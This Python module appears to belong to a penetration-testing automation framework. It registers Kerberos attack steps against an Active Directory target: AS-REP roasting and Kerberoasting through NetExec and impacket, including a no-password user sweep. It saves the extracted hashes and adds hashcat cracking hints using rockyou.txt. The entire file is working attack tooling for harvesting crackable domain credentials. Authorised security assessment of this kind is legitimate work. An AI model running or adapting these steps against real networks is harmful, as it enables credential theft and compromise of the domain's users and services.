"""steps/kerberos.py — AS-REP roasting, Kerberoasting, username validation."""

from core.steps   import (Step, Finding, register,
                          HAS_CREDS, HAS_DOMAIN, HAS_USERS,
                          INFO, HIGH)
from core.parsers import parse_asrep_hashes, parse_kerberoast_hashes

# Note: kerbrute is intentionally not wired in — it is not packaged on Kali
# (needs a manual binary from ropnop/kerbrute) and its user-validation overlaps
# with RID brute / --users. Add a Step here if you install it.


def _asrep(output, ctx):
    hashes = parse_asrep_hashes(output)
    if hashes:
        return ([Finding(HIGH, f"AS-REP roastable accounts: {len(hashes)}",
                 hint="hashcat -m 18200 <file> rockyou.txt")],
                [{"hash": h[:80] + "..."} for h in hashes], ["hash"])
    return [Finding(INFO, "No AS-REP roastable accounts (pre-auth required)")], [], []


def _kerberoast(output, ctx):
    hashes = parse_kerberoast_hashes(output)
    if hashes:
        return ([Finding(HIGH, f"Kerberoastable service accounts: {len(hashes)}",
                 hint="hashcat -m 13100 <file> rockyou.txt")],
                [{"hash": h[:80] + "..."} for h in hashes], ["hash"])
    return [Finding(INFO, "No Kerberoastable accounts found")], [], []


# --- AS-REP roast: NetExec LDAP (primary) + impacket (fallback) ------- #

register(Step(
    id="asrep_nxc", name="NetExec LDAP — AS-REP roast",
    category="Kerberos", phase=2, tool="nxc", requires=[HAS_CREDS],
    build_cmd=lambda c: ["nxc", "ldap", c.target, *c.nxc_auth_flags(),
                         "--asreproast", str(c.target_dir / "asrep_hashes.txt")],
    save_name="asrep_nxc.txt", parse=_asrep,
))

register(Step(
    id="asrep_impacket", name="impacket GetNPUsers — AS-REP roast (fallback)",
    category="Kerberos", phase=2, tool="impacket-GetNPUsers",
    requires=[HAS_DOMAIN, HAS_USERS],
    build_cmd=lambda c: [c.bin("impacket-GetNPUsers"), f"{c.domain}/",
                         "-usersfile", str(c.target_dir / "users.txt"),
                         "-dc-ip", c.target, "-format", "hashcat", "-no-pass"],
    save_name="asrep_impacket.txt", parse=_asrep,
))

# --- Kerberoast ------------------------------------------------------- #

register(Step(
    id="kerberoast_nxc", name="NetExec LDAP — Kerberoast",
    category="Kerberos", phase=2, tool="nxc", requires=[HAS_CREDS],
    build_cmd=lambda c: ["nxc", "ldap", c.target, *c.nxc_auth_flags(),
                         "--kerberoasting", str(c.target_dir / "kerberoast_hashes.txt")],
    save_name="kerberoast_nxc.txt", parse=_kerberoast,
))

register(Step(
    id="kerberoast_impacket", name="impacket GetUserSPNs — Kerberoast (fallback)",
    category="Kerberos", phase=2, tool="impacket-GetUserSPNs",
    requires=[HAS_DOMAIN, HAS_CREDS],
    build_cmd=lambda c: ([c.bin("impacket-GetUserSPNs"), "-dc-ip", c.target, "-request",
                          c.impacket_target().split("@")[0]]
                         if c.username and c.password is not None else None),
    save_name="kerberoast_impacket.txt", parse=_kerberoast,
))
